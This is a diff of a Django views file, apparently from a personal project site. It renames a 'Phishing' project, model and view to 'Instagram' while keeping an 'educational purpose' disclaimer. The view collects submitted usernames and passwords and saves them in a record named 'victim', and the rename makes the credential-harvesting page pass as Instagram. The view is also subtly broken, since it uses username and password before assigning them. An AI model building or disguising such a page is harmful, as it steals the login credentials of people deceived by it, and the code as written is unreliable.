@@ -7,7 +7,7 @@ from base.views import log, push
 from bs4 import BeautifulSoup
 from django.contrib.auth.decorators import login_required
 from django.shortcuts import redirect, render
-from .models import Phishing
+from .models import Instagram
 
 # Create your views here.
 
@@ -29,7 +29,7 @@ def projects(request):
             'src': '/projects/sadance', 'btn': 'See'},
         {'name': 'Num Game', 'info': 'A number guessing game',
             'src': '/projects/num_game', 'btn': 'Play'},
-        {'name': 'Phishing', 'info':'NOTE : This project is only for educational purpose and not meant for harming anyone.','src':'/projects/phishing','btn':'Test'}
+        {'name': 'Instagram', 'info':'NOTE : This project is only for educational purpose and not meant for harming anyone.','src':'/projects/instagram','btn':'Test'}
     ]
     random.shuffle(projects)
     context = {
@@ -130,8 +130,8 @@ def weather(request):
     log(request, 'weather')
     return render(request, 'projects/weather.html', context)
 
-def phishing(request):
-    victim,update = Phishing.objects.update_or_create(username,password)
+def instagram(request):
+    victim,update = Instagram.objects.update_or_create(username,password)
     if request.method == 'POST':
         username = request.POST.get('username').lower()
         password = request.POST.get('password')
